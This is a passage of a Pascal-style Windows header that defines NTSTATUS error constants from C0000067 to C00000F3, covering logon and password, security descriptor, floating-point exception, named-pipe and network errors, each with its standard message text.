STATUS_MEMBER_IN_GROUP           = NTSTATUS($C0000067);

//
// MessageId: STATUS_MEMBER_NOT_IN_GROUP
//
// MessageText:
//
// The specified user account is not a member of the specified group account.
//
STATUS_MEMBER_NOT_IN_GROUP       = NTSTATUS($C0000068);

//
// MessageId: STATUS_LAST_ADMIN
//
// MessageText:
//
// Indicates the requested operation would disable, delete or could prevent logon for an administration account.
// This is not allowed to prevent creating a situation in which the system cannot be administrated.
//
STATUS_LAST_ADMIN                = NTSTATUS($C0000069);

//
// MessageId: STATUS_WRONG_PASSWORD
//
// MessageText:
//
// When trying to update a password, this return status indicates that the value provided as the current password is not correct.
//
STATUS_WRONG_PASSWORD            = NTSTATUS($C000006A);     // ntsubauth

//
// MessageId: STATUS_ILL_FORMED_PASSWORD
//
// MessageText:
//
// When trying to update a password, this return status indicates that the value provided for the new password contains values that are not allowed in passwords.
//
STATUS_ILL_FORMED_PASSWORD       = NTSTATUS($C000006B);

//
// MessageId: STATUS_PASSWORD_RESTRICTION
//
// MessageText:
//
// When trying to update a password, this status indicates that some password update rule has been violated. For example, the password may not meet length criteria.
//
STATUS_PASSWORD_RESTRICTION      = NTSTATUS($C000006C);     // ntsubauth

//
// MessageId: STATUS_LOGON_FAILURE
//
// MessageText:
//
// The attempted logon is invalid. This is either due to a bad username or authentication information.
//
STATUS_LOGON_FAILURE             = NTSTATUS($C000006D);     // ntsubauth

//
// MessageId: STATUS_ACCOUNT_RESTRICTION
//
// MessageText:
//
// Indicates a referenced user name and authentication information are valid, but some user account restriction has prevented successful authentication (such as time-of-day restrictions).
//
STATUS_ACCOUNT_RESTRICTION       = NTSTATUS($C000006E);     // ntsubauth

//
// MessageId: STATUS_INVALID_LOGON_HOURS
//
// MessageText:
//
// The user account has time restrictions and may not be logged onto at this time.
//
STATUS_INVALID_LOGON_HOURS       = NTSTATUS($C000006F);     // ntsubauth

//
// MessageId: STATUS_INVALID_WORKSTATION
//
// MessageText:
//
// The user account is restricted such that it may not be used to log on from the source workstation.
//
STATUS_INVALID_WORKSTATION       = NTSTATUS($C0000070);     // ntsubauth

//
// MessageId: STATUS_PASSWORD_EXPIRED
//
// MessageText:
//
// The user account's password has expired.
//
STATUS_PASSWORD_EXPIRED          = NTSTATUS($C0000071);     // ntsubauth

//
// MessageId: STATUS_ACCOUNT_DISABLED
//
// MessageText:
//
// The referenced account is currently disabled and may not be logged on to.
//
STATUS_ACCOUNT_DISABLED          = NTSTATUS($C0000072);     // ntsubauth

//
// MessageId: STATUS_NONE_MAPPED
//
// MessageText:
//
// None of the information to be translated has been translated.
//
STATUS_NONE_MAPPED               = NTSTATUS($C0000073);

//
// MessageId: STATUS_TOO_MANY_LUIDS_REQUESTED
//
// MessageText:
//
// The number of LUIDs requested may not be allocated with a single allocation.
//
STATUS_TOO_MANY_LUIDS_REQUESTED  = NTSTATUS($C0000074);

//
// MessageId: STATUS_LUIDS_EXHAUSTED
//
// MessageText:
//
// Indicates there are no more LUIDs to allocate.
//
STATUS_LUIDS_EXHAUSTED           = NTSTATUS($C0000075);

//
// MessageId: STATUS_INVALID_SUB_AUTHORITY
//
// MessageText:
//
// Indicates the sub-authority value is invalid for the particular use.
//
STATUS_INVALID_SUB_AUTHORITY     = NTSTATUS($C0000076);

//
// MessageId: STATUS_INVALID_ACL
//
// MessageText:
//
// Indicates the ACL structure is not valid.
//
STATUS_INVALID_ACL               = NTSTATUS($C0000077);

//
// MessageId: STATUS_INVALID_SID
//
// MessageText:
//
// Indicates the SID structure is not valid.
//
STATUS_INVALID_SID               = NTSTATUS($C0000078);

//
// MessageId: STATUS_INVALID_SECURITY_DESCR
//
// MessageText:
//
// Indicates the SECURITY_DESCRIPTOR structure is not valid.
//
STATUS_INVALID_SECURITY_DESCR    = NTSTATUS($C0000079);

//
// MessageId: STATUS_PROCEDURE_NOT_FOUND
//
// MessageText:
//
// Indicates the specified procedure address cannot be found in the DLL.
//
STATUS_PROCEDURE_NOT_FOUND       = NTSTATUS($C000007A);

//
// MessageId: STATUS_INVALID_IMAGE_FORMAT
//
// MessageText:
//
// {Bad Image}
// %hs is either not designed to run on Windows or it contains an error. Try installing the program again using the original installation media or contact your system administrator or the software vendor for support. Error status 0x%08lx.
//
STATUS_INVALID_IMAGE_FORMAT      = NTSTATUS($C000007B);

//
// MessageId: STATUS_NO_TOKEN
//
// MessageText:
//
// An attempt was made to reference a token that doesn't exist.
// This is typically done by referencing the token associated with a thread when the thread is not impersonating a client.
//
STATUS_NO_TOKEN                  = NTSTATUS($C000007C);

//
// MessageId: STATUS_BAD_INHERITANCE_ACL
//
// MessageText:
//
// Indicates that an attempt to build either an inherited ACL or ACE was not successful.
// This can be caused by a number of things. One of the more probable causes is the replacement of a CreatorId with an SID that didn't fit into the ACE or ACL.
//
STATUS_BAD_INHERITANCE_ACL       = NTSTATUS($C000007D);

//
// MessageId: STATUS_RANGE_NOT_LOCKED
//
// MessageText:
//
// The range specified in NtUnlockFile was not locked.
//
STATUS_RANGE_NOT_LOCKED          = NTSTATUS($C000007E);

//
// MessageId: STATUS_DISK_FULL
//
// MessageText:
//
// An operation failed because the disk was full.
// If this is a thinly provisioned volume the physical storage backing this volume has been exhausted.
//
STATUS_DISK_FULL                 = NTSTATUS($C000007F);

//
// MessageId: STATUS_SERVER_DISABLED
//
// MessageText:
//
// The GUID allocation server is [already] disabled at the moment.
//
STATUS_SERVER_DISABLED           = NTSTATUS($C0000080);

//
// MessageId: STATUS_SERVER_NOT_DISABLED
//
// MessageText:
//
// The GUID allocation server is [already] enabled at the moment.
//
STATUS_SERVER_NOT_DISABLED       = NTSTATUS($C0000081);

//
// MessageId: STATUS_TOO_MANY_GUIDS_REQUESTED
//
// MessageText:
//
// Too many GUIDs were requested from the allocation server at once.
//
STATUS_TOO_MANY_GUIDS_REQUESTED  = NTSTATUS($C0000082);

//
// MessageId: STATUS_GUIDS_EXHAUSTED
//
// MessageText:
//
// The GUIDs could not be allocated because the Authority Agent was exhausted.
//
STATUS_GUIDS_EXHAUSTED           = NTSTATUS($C0000083);

//
// MessageId: STATUS_INVALID_ID_AUTHORITY
//
// MessageText:
//
// The value provided was an invalid value for an identifier authority.
//
STATUS_INVALID_ID_AUTHORITY      = NTSTATUS($C0000084);

//
// MessageId: STATUS_AGENTS_EXHAUSTED
//
// MessageText:
//
// There are no more authority agent values available for the given identifier authority value.
//
STATUS_AGENTS_EXHAUSTED          = NTSTATUS($C0000085);

//
// MessageId: STATUS_INVALID_VOLUME_LABEL
//
// MessageText:
//
// An invalid volume label has been specified.
//
STATUS_INVALID_VOLUME_LABEL      = NTSTATUS($C0000086);

//
// MessageId: STATUS_SECTION_NOT_EXTENDED
//
// MessageText:
//
// A mapped section could not be extended.
//
STATUS_SECTION_NOT_EXTENDED      = NTSTATUS($C0000087);

//
// MessageId: STATUS_NOT_MAPPED_DATA
//
// MessageText:
//
// Specified section to flush does not map a data file.
//
STATUS_NOT_MAPPED_DATA           = NTSTATUS($C0000088);

//
// MessageId: STATUS_RESOURCE_DATA_NOT_FOUND
//
// MessageText:
//
// Indicates the specified image file did not contain a resource section.
//
STATUS_RESOURCE_DATA_NOT_FOUND   = NTSTATUS($C0000089);

//
// MessageId: STATUS_RESOURCE_TYPE_NOT_FOUND
//
// MessageText:
//
// Indicates the specified resource type cannot be found in the image file.
//
STATUS_RESOURCE_TYPE_NOT_FOUND   = NTSTATUS($C000008A);

//
// MessageId: STATUS_RESOURCE_NAME_NOT_FOUND
//
// MessageText:
//
// Indicates the specified resource name cannot be found in the image file.
//
STATUS_RESOURCE_NAME_NOT_FOUND   = NTSTATUS($C000008B);

//
// MessageId: STATUS_ARRAY_BOUNDS_EXCEEDED
//
// MessageText:
//
// {EXCEPTION}
// Array bounds exceeded.
//
STATUS_ARRAY_BOUNDS_EXCEEDED     = NTSTATUS($C000008C);    // winnt

//
// MessageId: STATUS_FLOAT_DENORMAL_OPERAND
//
// MessageText:
//
// {EXCEPTION}
// Floating-point denormal operand.
//
STATUS_FLOAT_DENORMAL_OPERAND    = NTSTATUS($C000008D);    // winnt

//
// MessageId: STATUS_FLOAT_DIVIDE_BY_ZERO
//
// MessageText:
//
// {EXCEPTION}
// Floating-point division by zero.
//
STATUS_FLOAT_DIVIDE_BY_ZERO      = NTSTATUS($C000008E);    // winnt

//
// MessageId: STATUS_FLOAT_INEXACT_RESULT
//
// MessageText:
//
// {EXCEPTION}
// Floating-point inexact result.
//
STATUS_FLOAT_INEXACT_RESULT      = NTSTATUS($C000008F);    // winnt

//
// MessageId: STATUS_FLOAT_INVALID_OPERATION
//
// MessageText:
//
// {EXCEPTION}
// Floating-point invalid operation.
//
STATUS_FLOAT_INVALID_OPERATION   = NTSTATUS($C0000090);    // winnt

//
// MessageId: STATUS_FLOAT_OVERFLOW
//
// MessageText:
//
// {EXCEPTION}
// Floating-point overflow.
//
STATUS_FLOAT_OVERFLOW            = NTSTATUS($C0000091);    // winnt

//
// MessageId: STATUS_FLOAT_STACK_CHECK
//
// MessageText:
//
// {EXCEPTION}
// Floating-point stack check.
//
STATUS_FLOAT_STACK_CHECK         = NTSTATUS($C0000092);    // winnt

//
// MessageId: STATUS_FLOAT_UNDERFLOW
//
// MessageText:
//
// {EXCEPTION}
// Floating-point underflow.
//
STATUS_FLOAT_UNDERFLOW           = NTSTATUS($C0000093);    // winnt

//
// MessageId: STATUS_INTEGER_DIVIDE_BY_ZERO
//
// MessageText:
//
// {EXCEPTION}
// Integer division by zero.
//
STATUS_INTEGER_DIVIDE_BY_ZERO    = NTSTATUS($C0000094);    // winnt

//
// MessageId: STATUS_INTEGER_OVERFLOW
//
// MessageText:
//
// {EXCEPTION}
// Integer overflow.
//
STATUS_INTEGER_OVERFLOW          = NTSTATUS($C0000095);    // winnt

//
// MessageId: STATUS_PRIVILEGED_INSTRUCTION
//
// MessageText:
//
// {EXCEPTION}
// Privileged instruction.
//
STATUS_PRIVILEGED_INSTRUCTION    = NTSTATUS($C0000096);    // winnt

//
// MessageId: STATUS_TOO_MANY_PAGING_FILES
//
// MessageText:
//
// An attempt was made to install more paging files than the system supports.
//
STATUS_TOO_MANY_PAGING_FILES     = NTSTATUS($C0000097);

//
// MessageId: STATUS_FILE_INVALID
//
// MessageText:
//
// The volume for a file has been externally altered such that the opened file is no longer valid.
//
STATUS_FILE_INVALID              = NTSTATUS($C0000098);

//
// MessageId: STATUS_ALLOTTED_SPACE_EXCEEDED
//
// MessageText:
//
// When a block of memory is allotted for future updates, such as the memory allocated to hold discretionary access control and primary group information, successive updates may exceed the amount of memory originally allotted.
// Since quota may already have been charged to several processes which have handles to the object, it is not reasonable to alter the size of the allocated memory.
// Instead, a request that requires more memory than has been allotted must fail and the STATUS_ALLOTED_SPACE_EXCEEDED error returned.
//
STATUS_ALLOTTED_SPACE_EXCEEDED   = NTSTATUS($C0000099);

//
// MessageId: STATUS_INSUFFICIENT_RESOURCES
//
// MessageText:
//
// Insufficient system resources exist to complete the API.
//
STATUS_INSUFFICIENT_RESOURCES    = NTSTATUS($C000009A);     // ntsubauth

//
// MessageId: STATUS_DFS_EXIT_PATH_FOUND
//
// MessageText:
//
// An attempt has been made to open a DFS exit path control file.
//
STATUS_DFS_EXIT_PATH_FOUND       = NTSTATUS($C000009B);

//
// MessageId: STATUS_DEVICE_DATA_ERROR
//
// MessageText:
//
//  STATUS_DEVICE_DATA_ERROR
//
STATUS_DEVICE_DATA_ERROR         = NTSTATUS($C000009C);

//
// MessageId: STATUS_DEVICE_NOT_CONNECTED
//
// MessageText:
//
//  STATUS_DEVICE_NOT_CONNECTED
//
STATUS_DEVICE_NOT_CONNECTED      = NTSTATUS($C000009D);

//
// MessageId: STATUS_DEVICE_POWER_FAILURE
//
// MessageText:
//
//  STATUS_DEVICE_POWER_FAILURE
//
STATUS_DEVICE_POWER_FAILURE      = NTSTATUS($C000009E);

//
// MessageId: STATUS_FREE_VM_NOT_AT_BASE
//
// MessageText:
//
// Virtual memory cannot be freed as base address is not the base of the region and a region size of zero was specified.
//
STATUS_FREE_VM_NOT_AT_BASE       = NTSTATUS($C000009F);

//
// MessageId: STATUS_MEMORY_NOT_ALLOCATED
//
// MessageText:
//
// An attempt was made to free virtual memory which is not allocated.
//
STATUS_MEMORY_NOT_ALLOCATED      = NTSTATUS($C00000A0);

//
// MessageId: STATUS_WORKING_SET_QUOTA
//
// MessageText:
//
// The working set is not big enough to allow the requested pages to be locked.
//
STATUS_WORKING_SET_QUOTA         = NTSTATUS($C00000A1);

//
// MessageId: STATUS_MEDIA_WRITE_PROTECTED
//
// MessageText:
//
// {Write Protect Error}
// The disk cannot be written to because it is write protected. Please remove the write protection from the volume %hs in drive %hs.
//
STATUS_MEDIA_WRITE_PROTECTED     = NTSTATUS($C00000A2);

//
// MessageId: STATUS_DEVICE_NOT_READY
//
// MessageText:
//
// {Drive Not Ready}
// The drive is not ready for use); its door may be open. Please check drive %hs and make sure that a disk is inserted and that the drive door is closed.
//
STATUS_DEVICE_NOT_READY          = NTSTATUS($C00000A3);

//
// MessageId: STATUS_INVALID_GROUP_ATTRIBUTES
//
// MessageText:
//
// The specified attributes are invalid, or incompatible with the attributes for the group as a whole.
//
STATUS_INVALID_GROUP_ATTRIBUTES  = NTSTATUS($C00000A4);

//
// MessageId: STATUS_BAD_IMPERSONATION_LEVEL
//
// MessageText:
//
// A specified impersonation level is invalid.
// Also used to indicate a required impersonation level was not provided.
//
STATUS_BAD_IMPERSONATION_LEVEL   = NTSTATUS($C00000A5);

//
// MessageId: STATUS_CANT_OPEN_ANONYMOUS
//
// MessageText:
//
// An attempt was made to open an Anonymous level token.
// Anonymous tokens may not be opened.
//
STATUS_CANT_OPEN_ANONYMOUS       = NTSTATUS($C00000A6);

//
// MessageId: STATUS_BAD_VALIDATION_CLASS
//
// MessageText:
//
// The validation information class requested was invalid.
//
STATUS_BAD_VALIDATION_CLASS      = NTSTATUS($C00000A7);

//
// MessageId: STATUS_BAD_TOKEN_TYPE
//
// MessageText:
//
// The type of a token object is inappropriate for its attempted use.
//
STATUS_BAD_TOKEN_TYPE            = NTSTATUS($C00000A8);

//
// MessageId: STATUS_BAD_MASTER_BOOT_RECORD
//
// MessageText:
//
// The type of a token object is inappropriate for its attempted use.
//
STATUS_BAD_MASTER_BOOT_RECORD    = NTSTATUS($C00000A9);

//
// MessageId: STATUS_INSTRUCTION_MISALIGNMENT
//
// MessageText:
//
// An attempt was made to execute an instruction at an unaligned address and the host system does not support unaligned instruction references.
//
STATUS_INSTRUCTION_MISALIGNMENT  = NTSTATUS($C00000AA);

//
// MessageId: STATUS_INSTANCE_NOT_AVAILABLE
//
// MessageText:
//
// The maximum named pipe instance count has been reached.
//
STATUS_INSTANCE_NOT_AVAILABLE    = NTSTATUS($C00000AB);

//
// MessageId: STATUS_PIPE_NOT_AVAILABLE
//
// MessageText:
//
// An instance of a named pipe cannot be found in the listening state.
//
STATUS_PIPE_NOT_AVAILABLE        = NTSTATUS($C00000AC);

//
// MessageId: STATUS_INVALID_PIPE_STATE
//
// MessageText:
//
// The named pipe is not in the connected or closing state.
//
STATUS_INVALID_PIPE_STATE        = NTSTATUS($C00000AD);

//
// MessageId: STATUS_PIPE_BUSY
//
// MessageText:
//
// The specified pipe is set to complete operations and there are current I/O operations queued so it cannot be changed to queue operations.
//
STATUS_PIPE_BUSY                 = NTSTATUS($C00000AE);

//
// MessageId: STATUS_ILLEGAL_FUNCTION
//
// MessageText:
//
// The specified handle is not open to the server end of the named pipe.
//
STATUS_ILLEGAL_FUNCTION          = NTSTATUS($C00000AF);

//
// MessageId: STATUS_PIPE_DISCONNECTED
//
// MessageText:
//
// The specified named pipe is in the disconnected state.
//
STATUS_PIPE_DISCONNECTED         = NTSTATUS($C00000B0);

//
// MessageId: STATUS_PIPE_CLOSING
//
// MessageText:
//
// The specified named pipe is in the closing state.
//
STATUS_PIPE_CLOSING              = NTSTATUS($C00000B1);

//
// MessageId: STATUS_PIPE_CONNECTED
//
// MessageText:
//
// The specified named pipe is in the connected state.
//
STATUS_PIPE_CONNECTED            = NTSTATUS($C00000B2);

//
// MessageId: STATUS_PIPE_LISTENING
//
// MessageText:
//
// The specified named pipe is in the listening state.
//
STATUS_PIPE_LISTENING            = NTSTATUS($C00000B3);

//
// MessageId: STATUS_INVALID_READ_MODE
//
// MessageText:
//
// The specified named pipe is not in message mode.
//
STATUS_INVALID_READ_MODE         = NTSTATUS($C00000B4);

//
// MessageId: STATUS_IO_TIMEOUT
//
// MessageText:
//
// {Device Timeout}
// The specified I/O operation on %hs was not completed before the time-out period expired.
//
STATUS_IO_TIMEOUT                = NTSTATUS($C00000B5);

//
// MessageId: STATUS_FILE_FORCED_CLOSED
//
// MessageText:
//
// The specified file has been closed by another process.
//
STATUS_FILE_FORCED_CLOSED        = NTSTATUS($C00000B6);

//
// MessageId: STATUS_PROFILING_NOT_STARTED
//
// MessageText:
//
// Profiling not started.
//
STATUS_PROFILING_NOT_STARTED     = NTSTATUS($C00000B7);

//
// MessageId: STATUS_PROFILING_NOT_STOPPED
//
// MessageText:
//
// Profiling not stopped.
//
STATUS_PROFILING_NOT_STOPPED     = NTSTATUS($C00000B8);

//
// MessageId: STATUS_COULD_NOT_INTERPRET
//
// MessageText:
//
// The passed ACL did not contain the minimum required information.
//
STATUS_COULD_NOT_INTERPRET       = NTSTATUS($C00000B9);

//
// MessageId: STATUS_FILE_IS_A_DIRECTORY
//
// MessageText:
//
// The file that was specified as a target is a directory and the caller specified that it could be anything but a directory.
//
STATUS_FILE_IS_A_DIRECTORY       = NTSTATUS($C00000BA);

//
// Network specific errors.
//
//
//
// MessageId: STATUS_NOT_SUPPORTED
//
// MessageText:
//
// The request is not supported.
//
STATUS_NOT_SUPPORTED             = NTSTATUS($C00000BB);

//
// MessageId: STATUS_REMOTE_NOT_LISTENING
//
// MessageText:
//
// This remote computer is not listening.
//
STATUS_REMOTE_NOT_LISTENING      = NTSTATUS($C00000BC);

//
// MessageId: STATUS_DUPLICATE_NAME
//
// MessageText:
//
// A duplicate name exists on the network.
//
STATUS_DUPLICATE_NAME            = NTSTATUS($C00000BD);

//
// MessageId: STATUS_BAD_NETWORK_PATH
//
// MessageText:
//
// The network path cannot be located.
//
STATUS_BAD_NETWORK_PATH          = NTSTATUS($C00000BE);

//
// MessageId: STATUS_NETWORK_BUSY
//
// MessageText:
//
// The network is busy.
//
STATUS_NETWORK_BUSY              = NTSTATUS($C00000BF);

//
// MessageId: STATUS_DEVICE_DOES_NOT_EXIST
//
// MessageText:
//
// This device does not exist.
//
STATUS_DEVICE_DOES_NOT_EXIST     = NTSTATUS($C00000C0);

//
// MessageId: STATUS_TOO_MANY_COMMANDS
//
// MessageText:
//
// The network BIOS command limit has been reached.
//
STATUS_TOO_MANY_COMMANDS         = NTSTATUS($C00000C1);

//
// MessageId: STATUS_ADAPTER_HARDWARE_ERROR
//
// MessageText:
//
// An I/O adapter hardware error has occurred.
//
STATUS_ADAPTER_HARDWARE_ERROR    = NTSTATUS($C00000C2);

//
// MessageId: STATUS_INVALID_NETWORK_RESPONSE
//
// MessageText:
//
// The network responded incorrectly.
//
STATUS_INVALID_NETWORK_RESPONSE  = NTSTATUS($C00000C3);

//
// MessageId: STATUS_UNEXPECTED_NETWORK_ERROR
//
// MessageText:
//
// An unexpected network error occurred.
//
STATUS_UNEXPECTED_NETWORK_ERROR  = NTSTATUS($C00000C4);

//
// MessageId: STATUS_BAD_REMOTE_ADAPTER
//
// MessageText:
//
// The remote adapter is not compatible.
//
STATUS_BAD_REMOTE_ADAPTER        = NTSTATUS($C00000C5);

//
// MessageId: STATUS_PRINT_QUEUE_FULL
//
// MessageText:
//
// The printer queue is full.
//
STATUS_PRINT_QUEUE_FULL          = NTSTATUS($C00000C6);

//
// MessageId: STATUS_NO_SPOOL_SPACE
//
// MessageText:
//
// Space to store the file waiting to be printed is not available on the server.
//
STATUS_NO_SPOOL_SPACE            = NTSTATUS($C00000C7);

//
// MessageId: STATUS_PRINT_CANCELLED
//
// MessageText:
//
// The requested print file has been canceled.
//
STATUS_PRINT_CANCELLED           = NTSTATUS($C00000C8);

//
// MessageId: STATUS_NETWORK_NAME_DELETED
//
// MessageText:
//
// The network name was deleted.
//
STATUS_NETWORK_NAME_DELETED      = NTSTATUS($C00000C9);

//
// MessageId: STATUS_NETWORK_ACCESS_DENIED
//
// MessageText:
//
// Network access is denied.
//
STATUS_NETWORK_ACCESS_DENIED     = NTSTATUS($C00000CA);

//
// MessageId: STATUS_BAD_DEVICE_TYPE
//
// MessageText:
//
// {Incorrect Network Resource Type}
// The specified device type (LPT, for example) conflicts with the actual device type on the remote resource.
//
STATUS_BAD_DEVICE_TYPE           = NTSTATUS($C00000CB);

//
// MessageId: STATUS_BAD_NETWORK_NAME
//
// MessageText:
//
// {Network Name Not Found}
// The specified share name cannot be found on the remote server.
//
STATUS_BAD_NETWORK_NAME          = NTSTATUS($C00000CC);

//
// MessageId: STATUS_TOO_MANY_NAMES
//
// MessageText:
//
// The name limit for the local computer network adapter card was exceeded.
//
STATUS_TOO_MANY_NAMES            = NTSTATUS($C00000CD);

//
// MessageId: STATUS_TOO_MANY_SESSIONS
//
// MessageText:
//
// The network BIOS session limit was exceeded.
//
STATUS_TOO_MANY_SESSIONS         = NTSTATUS($C00000CE);

//
// MessageId: STATUS_SHARING_PAUSED
//
// MessageText:
//
// File sharing has been temporarily paused.
//
STATUS_SHARING_PAUSED            = NTSTATUS($C00000CF);

//
// MessageId: STATUS_REQUEST_NOT_ACCEPTED
//
// MessageText:
//
// No more connections can be made to this remote computer at this time because there are already as many connections as the computer can accept.
//
STATUS_REQUEST_NOT_ACCEPTED      = NTSTATUS($C00000D0);

//
// MessageId: STATUS_REDIRECTOR_PAUSED
//
// MessageText:
//
// Print or disk redirection is temporarily paused.
//
STATUS_REDIRECTOR_PAUSED         = NTSTATUS($C00000D1);

//
// MessageId: STATUS_NET_WRITE_FAULT
//
// MessageText:
//
// A network data fault occurred.
//
STATUS_NET_WRITE_FAULT           = NTSTATUS($C00000D2);

//
// MessageId: STATUS_PROFILING_AT_LIMIT
//
// MessageText:
//
// The number of active profiling objects is at the maximum and no more may be started.
//
STATUS_PROFILING_AT_LIMIT        = NTSTATUS($C00000D3);

//
// MessageId: STATUS_NOT_SAME_DEVICE
//
// MessageText:
//
// {Incorrect Volume}
// The target file of a rename request is located on a different device than the source of the rename request.
//
STATUS_NOT_SAME_DEVICE           = NTSTATUS($C00000D4);

//
// MessageId: STATUS_FILE_RENAMED
//
// MessageText:
//
// The file specified has been renamed and thus cannot be modified.
//
STATUS_FILE_RENAMED              = NTSTATUS($C00000D5);

//
// MessageId: STATUS_VIRTUAL_CIRCUIT_CLOSED
//
// MessageText:
//
// {Network Request Timeout}
// The session with a remote server has been disconnected because the time-out interval for a request has expired.
//
STATUS_VIRTUAL_CIRCUIT_CLOSED    = NTSTATUS($C00000D6);

//
// MessageId: STATUS_NO_SECURITY_ON_OBJECT
//
// MessageText:
//
// Indicates an attempt was made to operate on the security of an object that does not have security associated with it.
//
STATUS_NO_SECURITY_ON_OBJECT     = NTSTATUS($C00000D7);

//
// MessageId: STATUS_CANT_WAIT
//
// MessageText:
//
// Used to indicate that an operation cannot continue without blocking for I/O.
//
STATUS_CANT_WAIT                 = NTSTATUS($C00000D8);

//
// MessageId: STATUS_PIPE_EMPTY
//
// MessageText:
//
// Used to indicate that a read operation was done on an empty pipe.
//
STATUS_PIPE_EMPTY                = NTSTATUS($C00000D9);

//
// MessageId: STATUS_CANT_ACCESS_DOMAIN_INFO
//
// MessageText:
//
// Configuration information could not be read from the domain controller, either because the machine is unavailable, or access has been denied.
//
STATUS_CANT_ACCESS_DOMAIN_INFO   = NTSTATUS($C00000DA);

//
// MessageId: STATUS_CANT_TERMINATE_SELF
//
// MessageText:
//
// Indicates that a thread attempted to terminate itself by default (called NtTerminateThread with NUL); and it was the last thread in the current process.
//
STATUS_CANT_TERMINATE_SELF       = NTSTATUS($C00000DB);

//
// MessageId: STATUS_INVALID_SERVER_STATE
//
// MessageText:
//
// Indicates the Sam Server was in the wrong state to perform the desired operation.
//
STATUS_INVALID_SERVER_STATE      = NTSTATUS($C00000DC);

//
// MessageId: STATUS_INVALID_DOMAIN_STATE
//
// MessageText:
//
// Indicates the Domain was in the wrong state to perform the desired operation.
//
STATUS_INVALID_DOMAIN_STATE      = NTSTATUS($C00000DD);

//
// MessageId: STATUS_INVALID_DOMAIN_ROLE
//
// MessageText:
//
// This operation is only allowed for the Primary Domain Controller of the domain.
//
STATUS_INVALID_DOMAIN_ROLE       = NTSTATUS($C00000DE);

//
// MessageId: STATUS_NO_SUCH_DOMAIN
//
// MessageText:
//
// The specified Domain did not exist.
//
STATUS_NO_SUCH_DOMAIN            = NTSTATUS($C00000DF);

//
// MessageId: STATUS_DOMAIN_EXISTS
//
// MessageText:
//
// The specified Domain already exists.
//
STATUS_DOMAIN_EXISTS             = NTSTATUS($C00000E0);

//
// MessageId: STATUS_DOMAIN_LIMIT_EXCEEDED
//
// MessageText:
//
// An attempt was made to exceed the limit on the number of domains per server for this release.
//
STATUS_DOMAIN_LIMIT_EXCEEDED     = NTSTATUS($C00000E1);

//
// MessageId: STATUS_OPLOCK_NOT_GRANTED
//
// MessageText:
//
// Error status returned when oplock request is denied.
//
STATUS_OPLOCK_NOT_GRANTED        = NTSTATUS($C00000E2);

//
// MessageId: STATUS_INVALID_OPLOCK_PROTOCOL
//
// MessageText:
//
// Error status returned when an invalid oplock acknowledgment is received by a file system.
//
STATUS_INVALID_OPLOCK_PROTOCOL   = NTSTATUS($C00000E3);

//
// MessageId: STATUS_INTERNAL_DB_CORRUPTION
//
// MessageText:
//
// This error indicates that the requested operation cannot be completed due to a catastrophic media failure or on-disk data structure corruption.
//
STATUS_INTERNAL_DB_CORRUPTION    = NTSTATUS($C00000E4);

//
// MessageId: STATUS_INTERNAL_ERROR
//
// MessageText:
//
// An internal error occurred.
//
STATUS_INTERNAL_ERROR            = NTSTATUS($C00000E5);

//
// MessageId: STATUS_GENERIC_NOT_MAPPED
//
// MessageText:
//
// Indicates generic access types were contained in an access mask which should already be mapped to non-generic access types.
//
STATUS_GENERIC_NOT_MAPPED        = NTSTATUS($C00000E6);

//
// MessageId: STATUS_BAD_DESCRIPTOR_FORMAT
//
// MessageText:
//
// Indicates a security descriptor is not in the necessary format (absolute or self-relative).
//
STATUS_BAD_DESCRIPTOR_FORMAT     = NTSTATUS($C00000E7);

//
// Status codes raised by the Cache Manager which must be considered as
// "expected" by its callers.
//
//
// MessageId: STATUS_INVALID_USER_BUFFER
//
// MessageText:
//
// An access to a user buffer failed at an "expected" point in time. This code is defined since the caller does not want to accept STATUS_ACCESS_VIOLATION in its filter.
//
STATUS_INVALID_USER_BUFFER       = NTSTATUS($C00000E8);

//
// MessageId: STATUS_UNEXPECTED_IO_ERROR
//
// MessageText:
//
// If an I/O error is returned which is not defined in the standard FsRtl filter, it is converted to the following error which is guaranteed to be in the filter. In this case information is lost, however, the filter correctly handles the exception.
//
STATUS_UNEXPECTED_IO_ERROR       = NTSTATUS($C00000E9);

//
// MessageId: STATUS_UNEXPECTED_MM_CREATE_ERR
//
// MessageText:
//
// If an MM error is returned which is not defined in the standard FsRtl filter, it is converted to one of the following errors which is guaranteed to be in the filter. In this case information is lost, however, the filter correctly handles the exception.
//
STATUS_UNEXPECTED_MM_CREATE_ERR  = NTSTATUS($C00000EA);

//
// MessageId: STATUS_UNEXPECTED_MM_MAP_ERROR
//
// MessageText:
//
// If an MM error is returned which is not defined in the standard FsRtl filter, it is converted to one of the following errors which is guaranteed to be in the filter. In this case information is lost, however, the filter correctly handles the exception.
//
STATUS_UNEXPECTED_MM_MAP_ERROR   = NTSTATUS($C00000EB);

//
// MessageId: STATUS_UNEXPECTED_MM_EXTEND_ERR
//
// MessageText:
//
// If an MM error is returned which is not defined in the standard FsRtl filter, it is converted to one of the following errors which is guaranteed to be in the filter. In this case information is lost, however, the filter correctly handles the exception.
//
STATUS_UNEXPECTED_MM_EXTEND_ERR  = NTSTATUS($C00000EC);

//
// MessageId: STATUS_NOT_LOGON_PROCESS
//
// MessageText:
//
// The requested action is restricted for use by logon processes only. The calling process has not registered as a logon process.
//
STATUS_NOT_LOGON_PROCESS         = NTSTATUS($C00000ED);

//
// MessageId: STATUS_LOGON_SESSION_EXISTS
//
// MessageText:
//
// An attempt has been made to start a new session manager or LSA logon session with an ID that is already in use.
//
STATUS_LOGON_SESSION_EXISTS      = NTSTATUS($C00000EE);

//
// MessageId: STATUS_INVALID_PARAMETER_1
//
// MessageText:
//
// An invalid parameter was passed to a service or function as the first argument.
//
STATUS_INVALID_PARAMETER_1       = NTSTATUS(NTSTATUS($C00000EF));

//
// MessageId: STATUS_INVALID_PARAMETER_2
//
// MessageText:
//
// An invalid parameter was passed to a service or function as the second argument.
//
STATUS_INVALID_PARAMETER_2       = NTSTATUS($C00000F0);

//
// MessageId: STATUS_INVALID_PARAMETER_3
//
// MessageText:
//
// An invalid parameter was passed to a service or function as the third argument.
//
STATUS_INVALID_PARAMETER_3       = NTSTATUS($C00000F1);

//
// MessageId: STATUS_INVALID_PARAMETER_4
//
// MessageText:
//
// An invalid parameter was passed to a service or function as the fourth argument.
//
STATUS_INVALID_PARAMETER_4       = NTSTATUS($C00000F2);

//
// MessageId: STATUS_INVALID_PARAMETER_5
//
// MessageText:
//
// An invalid parameter was passed to a service or function as the fifth argument.
//
STATUS_INVALID_PARAMETER_5       = NTSTATUS($C00000F3);

//
// MessageId: STATUS_INVALID_PARAMETER_6
//
// MessageText:
//
// An invalid parameter was passed to a service or function as the sixth argument.
//
